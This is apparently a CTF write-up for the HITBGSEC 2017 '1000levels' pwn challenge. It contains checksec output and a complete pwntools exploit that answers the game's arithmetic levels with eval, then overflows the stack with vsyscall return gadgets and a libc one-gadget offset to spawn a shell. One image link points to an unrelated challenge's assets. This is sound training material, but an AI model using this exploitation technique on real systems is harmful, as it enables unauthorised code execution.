---
title: "HITBGSEC CTF 2017 - 1000levels (Pwn)"
header:
  overlay_image: /assets/images/hitbgsec2017/1000levels/header.jpg
  overlay_filter: 0.5
  caption: "Photo credits: Rebecca Li on Unsplash"
tags:
  - hitbgsec2017
  - writeup
  - pwn
---

Uninitialised variable usage allows for reliable exploitation of a classic stack
overflow on a NX and PIE enabled binary.

## Challenge Description

#### Points

200

#### Description

```
It's more diffcult.

nc 47.74.147.103 20001
```

#### Files

- [498a3f10-8976-4733-8bdb-30d6f9d9fdad.gz](https://hitb.xctf.org.cn/media/task/498a3f10-8976-4733-8bdb-30d6f9d9fdad.gz)

## Solution


```shell
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : ENABLED
RELRO     : Partial
gdb-peda$
```

![1]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/teufel/1.png){: .align-center}

Here's the final exploit script:

```python
from pwn import *
import sys

#context.log_level = "debug"

system_offset = 0x0000000000045390
ret_address = 0xffffffffff600400
target_offset = 0x4526a

difference = target_offset - system_offset

def answer(eqn):
    parse = eqn[9:eqn.find("=")]
    soln = eval(parse)
    return soln

def main():
    #p = process("./1000levels")
    p = remote("47.74.147.103", 20001)

    p.sendline("2")
    p.clean()
    p.sendline("1")
    p.clean()
    p.sendline("0")
    p.clean()
    p.sendline(str(difference))

    for i in range(999):
        p.recvline_contains("Level")
        eqn = p.clean()

        soln = answer(eqn)
        p.send(str(soln)+"\x00")
        if i % 50 == 0:
            log.info("Please wait... %d/1000" % i)

    pay = str(soln) + "\x00"
    pay = pay.ljust(56, "B")
    pay += p64(ret_address)*3
    log.info("Injected our vsyscall ROPs")

    p.send(pay)
    p.clean()

    p.success("Shell spawned! Enjoy!")
    p.interactive()

if __name__ == "__main__":
    main()
```

Running the exploit:

[![asciicast](https://asciinema.org/a/hkB2nBw48CADpbHaeuvkZF9zO.png)](https://asciinema.org/a/hkB2nBw48CADpbHaeuvkZF9zO)

Flag: **HITB{d989d44665a5a58565e09e7442606506}**
